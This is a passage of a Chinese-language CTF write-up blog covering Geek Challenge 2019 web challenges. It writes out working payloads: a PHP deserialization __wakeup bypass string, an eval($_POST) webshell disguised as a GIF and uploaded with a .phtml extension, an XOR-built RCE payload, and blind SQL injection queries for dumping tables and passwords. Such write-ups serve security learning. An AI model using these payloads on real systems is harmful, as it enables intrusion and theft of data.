+<p>最后用 <code>password=404%250&money[]=1</code> 的参数成功拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;40e309cf-6975-439d-912d-0c66009cd05e&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p>
+<p>打开之后看到了一只猫猫，可以用鼠标操控毛线球逗它玩，页面上方还有“备份”的提示。于是咱用 wwwscan 扫描了一下，顺利下载到了 <code>.../<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></code>。看了一下文件，发现以下主要代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>很明显这里考了一个反序列化的操作，我把他的代码稍作修改，看了一下序列化的结果。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出的结果是 <code>O:4:"Name":2:&#123;s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;&#125;</code>。因为还要绕过 <code>__wakeup()</code>，所以要把上述输出的 2 改成 3 或者一个更大的数。然后因为 username 和 password 都是私有成员，所以把类名和成员名前面以空格输出的 null 字符换成 \0。</p>
+<p>最后将请求 url 拼接起来 <code>.../?select=O:4:"Name":2:&#123;s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;&#125;</code>。使用 Python 的 Requests 库访问，成功拿到 flag。（我也不知道为什么直接 HackBar 访问不显示 flag）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14414a53-1fe9-4623-a67b-07b581d4bbcb&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>这题很明显地提示了使用一波菜刀，于是果断用菜刀连上去。一开始用菜刀的文件管理找了很久，并没有找到 flag。于是就打开了一波虚拟终端，整了一波 <code>find / -name flag</code>。在一堆 Permission Denied 刷过之后找到了 <code>/flag</code>。然后执行一波 <code>cat /flag</code> 就成功地拿到了 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3d1c3437-1ea2-45ea-9660-5d304e2b43c5&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p>
+<p>打开之后是个朴素的上传界面，首先随便写了句 <code>phpinfo</code> 伪装成 png 传上去，结果提示不能含有字符 <code>&lt;?</code>，于是果断换了一种只有 php 5.x 可以执行的格式（事实证明还是管的），但是依旧被识别了。一番查找之后在文件头部加上了 <code>GIF89a?</code> 成功过掉这一个点。结果在改拓展名的时候又失败了，提示不能用 <code>.php</code> 拓展名。搜索了一波发现可以用 <code>.phtml</code> 这个后缀。于是一番修改之后，“图片”传了上去，一句话木马得以执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;Citrone&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用菜刀连上之后，进虚拟终端里直接 <code>cat /flag</code> 就能得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14129955-5097-4e0d-91ff-b200f9a11b5d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">AntSword</span></p>
+<p>题目一开始就给了段很顶的代码，直接把字母数字都过滤了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>一番查找之下找到了神奇操作，通过其他字符的异或得到字母和数字来构造指令。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">原理参考</a> 于是我当即用可以使用的各种字符相互异或打了个表，然后筛选出了可构成字母和数字的组合。然后照着构造了  <code>code=$_=%27`&#123;&#123;&#123;%27^%27?%3C%3E/%27;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&_=assert&__=eval($_POST[%22l%22])</code> 这个 payload，成功连上。但是因为过滤了太多东西，导致终端命令几乎没法执行。</p>
+<p>在一番查询之后找到了蚁剑，辗转在 Kali Linux 装上之后用上了 bypass disable 的插件，然后成功执行了 <code>readflag</code> 读取到了flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b4c4e9fb-ea8c-4351-98e1-b1e8e5794411&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>这题其实需要一点仔细的观察，跟之前开门见山的注入点有点不一样，给出的账号和密码的框并不是注入的地方。点完五个按钮可以拿到“第六个按钮”的暗示，于是看了一手源码，发现有一行代码被注释掉了，取消注释发现了一个框，请求是 <code>../search.php?id=</code>，也就是那几个按钮的 ID。所有的结果都出现过了，其实一开始我是没有思路的，后来被提醒了这波是盲注，于是就构造了个 <code>(ascii(substr((select(database())),1,1))&gt;1)^0</code> 试了一手，发现大于和小于的结果的确不一样（分别会对应 <code>id=1</code> 和 <code>id=0</code> 的结果），于是拿出之前写好的二分模板，略作修改跑了起来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆表</span><br><span class="line">(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#爆列</span><br><span class="line">(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema&#x3D;database())),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br><span class="line">#爆出 flag</span><br><span class="line">(ascii(substr((select(group_concat(password))from(F1naI1y)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0</span><br></pre></td></tr></table></figure>
+
+<p>其实这题还是有点心机的，flag 放在了很长的 password 里面（总共200+字符，如果不用二分得跑很久）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43d07021-39af-481a-a873-3f9e1d0a29c0&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019"><span class="toc-number">1.</span> <span class="toc-text">极客大挑战2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-SQL"><span class="toc-number">1.1.</span> <span class="toc-text">Easy SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Havefun"><span class="toc-number">1.2.</span> <span class="toc-text">Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secret-File"><span class="toc-number">1.3.</span> <span class="toc-text">Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LoveSQL"><span class="toc-number">1.4.</span> <span class="toc-text">LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Http"><span class="toc-number">1.5.</span> <span class="toc-text">Http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySQL"><span class="toc-number">1.6.</span> <span class="toc-text">BabySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HardSQL"><span class="toc-number">1.7.</span> <span class="toc-text">HardSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BuyFlag"><span class="toc-number">1.8.</span> <span class="toc-text">BuyFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">1.9.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Knife"><span class="toc-number">1.10.</span> <span class="toc-text">Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload"><span class="toc-number">1.11.</span> <span class="toc-text">Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-ME"><span class="toc-number">1.12.</span> <span class="toc-text">RCE ME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FinalSQL"><span class="toc-number">1.13.</span> <span class="toc-text">FinalSQL</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/50bef630.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&text=极客大挑战2019 WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&is_video=false&description=极客大挑战2019 WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2019 WriteUp&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/50bef630.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&title=极客大挑战2019 WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/50bef630.html&name=极客大挑战2019 WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/50bef630.html&t=极客大挑战2019 WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
